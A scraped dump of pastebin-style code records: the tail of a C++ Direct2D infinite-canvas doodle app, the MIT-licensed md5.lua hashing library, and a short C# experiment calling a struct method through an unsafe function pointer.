                offscreenDirty = true;
            UpdateStatus(hwnd);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        else if (isDrawing && (wParam & MK_LBUTTON)) {
            int worldX = x + scrollX;
            int worldY = y + scrollY;
            if (strokeBuffer.empty())
                strokeBuffer.push_back(DrawPoint(worldX, worldY));
            else {
                const DrawPoint& lastPt = strokeBuffer.back();
                double dx = worldX - lastPt.x;
                double dy = worldY - lastPt.y;
                double distance = sqrt(dx * dx + dy * dy);
                if (distance >= MIN_DISTANCE)
                    strokeBuffer.push_back(DrawPoint(worldX, worldY));
            }
            // Compute dirty rectangle for the new segment (optional, for partial redraw)
            RECT dirty;
            int clientPrevX = strokeBuffer.back().x - scrollX;
            int clientPrevY = strokeBuffer.back().y - scrollY;
            int clientNewX = x;
            int clientNewY = y;
            dirty.left = std::min(clientPrevX, clientNewX) - brushSize;
            dirty.top = std::min(clientPrevY, clientNewY) - brushSize;
            dirty.right = std::max(clientPrevX, clientNewX) + brushSize;
            dirty.bottom = std::max(clientPrevY, clientNewY) + brushSize;
            InvalidateRect(hwnd, &dirty, FALSE);
        }
        return 0;
    }
    case WM_USER + 1:
    {
        // Custom message after state loading.
        offscreenDirty = true;
        UpdateOffscreenBuffer(hwnd);
        InvalidateRect(hwnd, NULL, TRUE);
        break;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hwnd, &ps);

        pRenderTarget->BeginDraw();

        // Update offscreen buffer if dirty.
        if (offscreenDirty)
        {
            UpdateOffscreenBuffer(hwnd);
        }

        // Draw the persistent offscreen render target.
        ID2D1Bitmap* pOffscreenBitmap = nullptr;
        pOffscreenRT->GetBitmap(&pOffscreenBitmap);
        pRenderTarget->DrawBitmap(pOffscreenBitmap);
        pOffscreenBitmap->Release();

        // Overlay in-progress stroke.
        if (isDrawing && !strokeBuffer.empty())
        {
            DrawSmoothStroke(pRenderTarget, strokeBuffer, isEraserMode, currentBrushColor, brushSize, scrollX, scrollY);
        }

        // Get the full client area for grid drawing.
        RECT rcClient;
        GetClientRect(hwnd, &rcClient);
        D2D1_RECT_F d2dRect = D2D1::RectF(0, 0, (FLOAT)rcClient.right, (FLOAT)rcClient.bottom);
        if (showGrid)
        {
            DrawGrid(pRenderTarget, d2dRect);
        }

        // Render the status bar using Direct2D/DirectWrite.
        {
            float statusBarHeight = 30.0f;
            D2D1_RECT_F statusRect = D2D1::RectF(
                0,
                (FLOAT)rcClient.bottom - statusBarHeight,
                (FLOAT)rcClient.right,
                (FLOAT)rcClient.bottom
            );
            // Fill status bar background.
            ID2D1SolidColorBrush* pStatusBgBrush = nullptr;
            pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(0.2f, 0.2f, 0.2f), &pStatusBgBrush);
            pRenderTarget->FillRectangle(statusRect, pStatusBgBrush);
            pStatusBgBrush->Release();
            // Draw status text.
            ID2D1SolidColorBrush* pTextBrush = nullptr;
            pRenderTarget->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pTextBrush);
            pRenderTarget->DrawTextW(
                g_statusText.c_str(),
                static_cast<UINT32>(g_statusText.length()),
                pTextFormat,
                &statusRect,
                pTextBrush,
                D2D1_DRAW_TEXT_OPTIONS_NONE,
                DWRITE_MEASURING_MODE_NATURAL
            );
            pTextBrush->Release();
        }

        HRESULT hr = pRenderTarget->EndDraw();
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_SETCURSOR:
    {
        if (LOWORD(lParam) == HTCLIENT) {
            if (isSpacePressed) {
                SetCursor(LoadCursor(NULL, IDC_SIZEALL));
                return TRUE;
            }
            else if (isPaintbrushSelected || isEraserMode) {
                SetCursor(LoadCursor(NULL, IDC_CROSS));
                return TRUE;
            }
        }
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    case WM_DESTROY:
    {
        if (sessionDirty)
        {
            SaveCanvasState();
            sessionDirty = false;
        }
        DiscardDeviceResources();
        if (pFactory)
        {
            pFactory->Release();
            pFactory = nullptr;
        }
        if (pTextFormat)
        {
            pTextFormat->Release();
            pTextFormat = nullptr;
        }
        if (pDWriteFactory)
        {
            pDWriteFactory->Release();
            pDWriteFactory = nullptr;
        }
        PostQuitMessage(0);
        return 0;
    }
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

//----------------------------------------------------------------
// WinMain
//----------------------------------------------------------------

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    INITCOMMONCONTROLSEX icex = { sizeof(INITCOMMONCONTROLSEX), ICC_BAR_CLASSES };
    InitCommonControlsEx(&icex);
    const wchar_t CLASS_NAME[] = L""InfiniteCanvasClass"";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));
    RegisterClass(&wc);
    hInst = hInstance;
    hWnd = CreateWindowEx(0, CLASS_NAME,
        L""Infinite Canvas Doodle App (Direct2D Accelerated, P=Brush, E=Eraser, C=Clear, +/-=BrushSize, Space+Drag/Arrow=Panning, Home=Reset, Q=Color, G=Grid, A=Alpha, PgUp=ZoomIn, PgDn=ZoomOut, F1=About)"",
        WS_OVERLAPPEDWINDOW | WS_MAXIMIZE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, hInstance, NULL);
    if (hWnd == NULL)
        return 0;
    // Enable double buffering via WS_EX_COMPOSITED.
    SetWindowLongPtr(hWnd, GWL_EXSTYLE, GetWindowLongPtr(hWnd, GWL_EXSTYLE) | WS_EX_COMPOSITED);
    ShowWindow(hWnd, SW_SHOWMAXIMIZED);
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
```"
YdJyfgBD,md5,i6_quadcore,Lua,Sunday 23rd of March 2025 01:02:40 AM CDT,"local md5 = {
    _VERSION     = ""md5.lua 1.1.0"",
    _DESCRIPTION = ""MD5 computation in Lua (5.1-3, LuaJIT)"",
    _URL         = ""https://github.com/kikito/md5.lua"",
    _LICENSE     = [[
      MIT LICENSE
  
      Copyright (c) 2013 Enrique García Cota + Adam Baldwin + hanzao + Equi 4 Software
  
      Permission is hereby granted, free of charge, to any person obtaining a
      copy of this software and associated documentation files (the
      ""Software""), to deal in the Software without restriction, including
      without limitation the rights to use, copy, modify, merge, publish,
      distribute, sublicense, and/or sell copies of the Software, and to
      permit persons to whom the Software is furnished to do so, subject to
      the following conditions:
  
      The above copyright notice and this permission notice shall be included
      in all copies or substantial portions of the Software.
  
      THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS
      OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
      MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
      IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
      CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
      TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
      SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
    ]]
  }
  
  -- bit lib implementions
  
  local char, byte, format, rep, sub =
    string.char, string.byte, string.format, string.rep, string.sub
  local bit_or, bit_and, bit_not, bit_xor, bit_rshift, bit_lshift
  
  local ok, bit = pcall(require, 'bit')
  local ok_ffi, ffi = pcall(require, 'ffi')
  if ok then
    bit_or, bit_and, bit_not, bit_xor, bit_rshift, bit_lshift = bit.bor, bit.band, bit.bnot, bit.bxor, bit.rshift, bit.lshift
  else
    ok, bit = pcall(require, 'bit32')
  
    if ok then
  
      bit_not = bit.bnot
  
      local tobit = function(n)
        return n <= 0x7fffffff and n or -(bit_not(n) + 1)
      end
  
      local normalize = function(f)
        return function(a,b) return tobit(f(tobit(a), tobit(b))) end
      end
  
      bit_or, bit_and, bit_xor = normalize(bit.bor), normalize(bit.band), normalize(bit.bxor)
      bit_rshift, bit_lshift = normalize(bit.rshift), normalize(bit.lshift)
  
    else
  
      local function tbl2number(tbl)
        local result = 0
        local power = 1
        for i = 1, #tbl do
          result = result + tbl[i] * power
          power = power * 2
        end
        return result
      end
  
      local function expand(t1, t2)
        local big, small = t1, t2
        if(#big < #small) then
          big, small = small, big
        end
        -- expand small
        for i = #small + 1, #big do
          small[i] = 0
        end
      end
  
      local to_bits -- needs to be declared before bit_not
  
      bit_not = function(n)
        local tbl = to_bits(n)
        local size = math.max(#tbl, 32)
        for i = 1, size do
          if(tbl[i] == 1) then
            tbl[i] = 0
          else
            tbl[i] = 1
          end
        end
        return tbl2number(tbl)
      end
  
      -- defined as local above
      to_bits = function (n)
        if(n < 0) then
          -- negative
          return to_bits(bit_not(math.abs(n)) + 1)
        end
        -- to bits table
        local tbl = {}
        local cnt = 1
        local last
        while n > 0 do
          last      = n % 2
          tbl[cnt]  = last
          n         = (n-last)/2
          cnt       = cnt + 1
        end
  
        return tbl
      end
  
      bit_or = function(m, n)
        local tbl_m = to_bits(m)
        local tbl_n = to_bits(n)
        expand(tbl_m, tbl_n)
  
        local tbl = {}
        for i = 1, #tbl_m do
          if(tbl_m[i]== 0 and tbl_n[i] == 0) then
            tbl[i] = 0
          else
            tbl[i] = 1
          end
        end
  
        return tbl2number(tbl)
      end
  
      bit_and = function(m, n)
        local tbl_m = to_bits(m)
        local tbl_n = to_bits(n)
        expand(tbl_m, tbl_n)
  
        local tbl = {}
        for i = 1, #tbl_m do
          if(tbl_m[i]== 0 or tbl_n[i] == 0) then
            tbl[i] = 0
          else
            tbl[i] = 1
          end
        end
  
        return tbl2number(tbl)
      end
  
      bit_xor = function(m, n)
        local tbl_m = to_bits(m)
        local tbl_n = to_bits(n)
        expand(tbl_m, tbl_n)
  
        local tbl = {}
        for i = 1, #tbl_m do
          if(tbl_m[i] ~= tbl_n[i]) then
            tbl[i] = 1
          else
            tbl[i] = 0
          end
        end
  
        return tbl2number(tbl)
      end
  
      bit_rshift = function(n, bits)
        local high_bit = 0
        if(n < 0) then
          -- negative
          n = bit_not(math.abs(n)) + 1
          high_bit = 0x80000000
        end
  
        local floor = math.floor
  
        for i=1, bits do
          n = n/2
          n = bit_or(floor(n), high_bit)
        end
        return floor(n)
      end
  
      bit_lshift = function(n, bits)
        if(n < 0) then
          -- negative
          n = bit_not(math.abs(n)) + 1
        end
  
        for i=1, bits do
          n = n*2
        end
        return bit_and(n, 0xFFFFFFFF)
      end
    end
  end
  
  -- convert little-endian 32-bit int to a 4-char string
  local lei2str
  -- function is defined this way to allow full jit compilation (removing UCLO instruction in LuaJIT)
  if ok_ffi then
    local ct_IntType = ffi.typeof(""int[1]"")
    lei2str = function(i) return ffi.string(ct_IntType(i), 4) end
  else
    lei2str = function (i)
      local f=function (s) return char( bit_and( bit_rshift(i, s), 255)) end
      return f(0)..f(8)..f(16)..f(24)
    end
  end
  
  
  
  -- convert raw string to big-endian int
  local function str2bei(s)
    local v=0
    for i=1, #s do
      v = v * 256 + byte(s, i)
    end
    return v
  end
  
  -- convert raw string to little-endian int
  local str2lei
  
  if ok_ffi then
    local ct_constcharptr = ffi.typeof(""const char*"")
    local ct_constintptr = ffi.typeof(""const int*"")
    str2lei = function(s)
      local int = ct_constcharptr(s)
      return ffi.cast(ct_constintptr, int)[0]
    end
  else
    str2lei = function(s)
      local v=0
      for i = #s,1,-1 do
        v = v*256 + byte(s, i)
      end
      return v
      end
  end
  
  
  -- cut up a string in little-endian ints of given size
  local function cut_le_str(s)
    return {
      str2lei(sub(s, 1, 4)),
      str2lei(sub(s, 5, 8)),
      str2lei(sub(s, 9, 12)),
      str2lei(sub(s, 13, 16)),
      str2lei(sub(s, 17, 20)),
      str2lei(sub(s, 21, 24)),
      str2lei(sub(s, 25, 28)),
      str2lei(sub(s, 29, 32)),
      str2lei(sub(s, 33, 36)),
      str2lei(sub(s, 37, 40)),
      str2lei(sub(s, 41, 44)),
      str2lei(sub(s, 45, 48)),
      str2lei(sub(s, 49, 52)),
      str2lei(sub(s, 53, 56)),
      str2lei(sub(s, 57, 60)),
      str2lei(sub(s, 61, 64)),
    }
  end
  
  -- An MD5 mplementation in Lua, requires bitlib (hacked to use LuaBit from above, ugh)
  -- 10/02/2001 jcw@equi4.com
  
  local CONSTS = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
    0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
    0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
    0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
    0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
    0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
    0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
    0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
    0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
    0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
  }
  
  local f=function (x,y,z) return bit_or(bit_and(x,y),bit_and(-x-1,z)) end
  local g=function (x,y,z) return bit_or(bit_and(x,z),bit_and(y,-z-1)) end
  local h=function (x,y,z) return bit_xor(x,bit_xor(y,z)) end
  local i=function (x,y,z) return bit_xor(y,bit_or(x,-z-1)) end
  local z=function (ff,a,b,c,d,x,s,ac)
    a=bit_and(a+ff(b,c,d)+x+ac,0xFFFFFFFF)
    -- be *very* careful that left shift does not cause rounding!
    return bit_or(bit_lshift(bit_and(a,bit_rshift(0xFFFFFFFF,s)),s),bit_rshift(a,32-s))+b
  end
  
  local function transform(A,B,C,D,X)
    local a,b,c,d=A,B,C,D
    local t=CONSTS
  
    a=z(f,a,b,c,d,X[ 0], 7,t[ 1])
    d=z(f,d,a,b,c,X[ 1],12,t[ 2])
    c=z(f,c,d,a,b,X[ 2],17,t[ 3])
    b=z(f,b,c,d,a,X[ 3],22,t[ 4])
    a=z(f,a,b,c,d,X[ 4], 7,t[ 5])
    d=z(f,d,a,b,c,X[ 5],12,t[ 6])
    c=z(f,c,d,a,b,X[ 6],17,t[ 7])
    b=z(f,b,c,d,a,X[ 7],22,t[ 8])
    a=z(f,a,b,c,d,X[ 8], 7,t[ 9])
    d=z(f,d,a,b,c,X[ 9],12,t[10])
    c=z(f,c,d,a,b,X[10],17,t[11])
    b=z(f,b,c,d,a,X[11],22,t[12])
    a=z(f,a,b,c,d,X[12], 7,t[13])
    d=z(f,d,a,b,c,X[13],12,t[14])
    c=z(f,c,d,a,b,X[14],17,t[15])
    b=z(f,b,c,d,a,X[15],22,t[16])
  
    a=z(g,a,b,c,d,X[ 1], 5,t[17])
    d=z(g,d,a,b,c,X[ 6], 9,t[18])
    c=z(g,c,d,a,b,X[11],14,t[19])
    b=z(g,b,c,d,a,X[ 0],20,t[20])
    a=z(g,a,b,c,d,X[ 5], 5,t[21])
    d=z(g,d,a,b,c,X[10], 9,t[22])
    c=z(g,c,d,a,b,X[15],14,t[23])
    b=z(g,b,c,d,a,X[ 4],20,t[24])
    a=z(g,a,b,c,d,X[ 9], 5,t[25])
    d=z(g,d,a,b,c,X[14], 9,t[26])
    c=z(g,c,d,a,b,X[ 3],14,t[27])
    b=z(g,b,c,d,a,X[ 8],20,t[28])
    a=z(g,a,b,c,d,X[13], 5,t[29])
    d=z(g,d,a,b,c,X[ 2], 9,t[30])
    c=z(g,c,d,a,b,X[ 7],14,t[31])
    b=z(g,b,c,d,a,X[12],20,t[32])
  
    a=z(h,a,b,c,d,X[ 5], 4,t[33])
    d=z(h,d,a,b,c,X[ 8],11,t[34])
    c=z(h,c,d,a,b,X[11],16,t[35])
    b=z(h,b,c,d,a,X[14],23,t[36])
    a=z(h,a,b,c,d,X[ 1], 4,t[37])
    d=z(h,d,a,b,c,X[ 4],11,t[38])
    c=z(h,c,d,a,b,X[ 7],16,t[39])
    b=z(h,b,c,d,a,X[10],23,t[40])
    a=z(h,a,b,c,d,X[13], 4,t[41])
    d=z(h,d,a,b,c,X[ 0],11,t[42])
    c=z(h,c,d,a,b,X[ 3],16,t[43])
    b=z(h,b,c,d,a,X[ 6],23,t[44])
    a=z(h,a,b,c,d,X[ 9], 4,t[45])
    d=z(h,d,a,b,c,X[12],11,t[46])
    c=z(h,c,d,a,b,X[15],16,t[47])
    b=z(h,b,c,d,a,X[ 2],23,t[48])
  
    a=z(i,a,b,c,d,X[ 0], 6,t[49])
    d=z(i,d,a,b,c,X[ 7],10,t[50])
    c=z(i,c,d,a,b,X[14],15,t[51])
    b=z(i,b,c,d,a,X[ 5],21,t[52])
    a=z(i,a,b,c,d,X[12], 6,t[53])
    d=z(i,d,a,b,c,X[ 3],10,t[54])
    c=z(i,c,d,a,b,X[10],15,t[55])
    b=z(i,b,c,d,a,X[ 1],21,t[56])
    a=z(i,a,b,c,d,X[ 8], 6,t[57])
    d=z(i,d,a,b,c,X[15],10,t[58])
    c=z(i,c,d,a,b,X[ 6],15,t[59])
    b=z(i,b,c,d,a,X[13],21,t[60])
    a=z(i,a,b,c,d,X[ 4], 6,t[61])
    d=z(i,d,a,b,c,X[11],10,t[62])
    c=z(i,c,d,a,b,X[ 2],15,t[63])
    b=z(i,b,c,d,a,X[ 9],21,t[64])
  
    return bit_and(A+a,0xFFFFFFFF),bit_and(B+b,0xFFFFFFFF),
           bit_and(C+c,0xFFFFFFFF),bit_and(D+d,0xFFFFFFFF)
  end
  
  ----------------------------------------------------------------
  
  local function md5_update(self, s)
    self.pos = self.pos + #s
    s = self.buf .. s
    for ii = 1, #s - 63, 64 do
      local X = cut_le_str(sub(s,ii,ii+63))
      assert(#X == 16)
      X[0] = table.remove(X,1) -- zero based!
      self.a,self.b,self.c,self.d = transform(self.a,self.b,self.c,self.d,X)
    end
    self.buf = sub(s, math.floor(#s/64)*64 + 1, #s)
    return self
  end
  
  local function md5_finish(self)
    local msgLen = self.pos
    local padLen = 56 - msgLen % 64
  
    if msgLen % 64 > 56 then padLen = padLen + 64 end
  
    if padLen == 0 then padLen = 64 end
  
    local s = char(128) .. rep(char(0),padLen-1) .. lei2str(bit_and(8*msgLen, 0xFFFFFFFF)) .. lei2str(math.floor(msgLen/0x20000000))
    md5_update(self, s)
  
    assert(self.pos % 64 == 0)
    return lei2str(self.a) .. lei2str(self.b) .. lei2str(self.c) .. lei2str(self.d)
  end
  
  ----------------------------------------------------------------
  
  function md5.new()
    return { a = CONSTS[65], b = CONSTS[66], c = CONSTS[67], d = CONSTS[68],
             pos = 0,
             buf = '',
             update = md5_update,
             finish = md5_finish }
  end
  
  function md5.tohex(s)
    return format(""%08x%08x%08x%08x"", str2bei(sub(s, 1, 4)), str2bei(sub(s, 5, 8)), str2bei(sub(s, 9, 12)), str2bei(sub(s, 13, 16)))
  end
  
  function md5.sum(s)
    return md5.new():update(s):finish()
  end
  
  function md5.sumhexa(s)
    return md5.tohex(md5.sum(s))
  end
  
  return md5"
ftJVPDZt,what,whitelava3203,C#,Sunday 23rd of March 2025 12:43:06 AM CDT,"using System.Reflection;

public interface IMyInterface
{
    void MyFunction();
}

public struct MyStruct : IMyInterface
{
    public void MyFunction() => Console.WriteLine(""Hello World!"");
}

public unsafe class Program
{
    const int TestMode = 1;
    public static void Main()
    {
        MyStruct instance = default;
        MyStruct* ptr = &instance;
        MethodInfo method = typeof(MyStruct).GetMethod(""MyFunction"");
        delegate*<void*, void> func1 = (delegate*<void*, void>)method.MethodHandle.GetFunctionPointer();

        switch (TestMode)
        {
            case 1:
                func1(ptr); //System.ExecutionEngineException: 'Exception of type 'System.ExecutionEngineException' was thrown.'
                break;
            case 2:
                func1((void*)1); //System.ExecutionEngineException: 'Exception of type 'System.ExecutionEngineException' was thrown.'
                break;
            case 3:
                func1((void*)0); //no error
                func1(ptr); //no error
                break;
        }
    }
}"
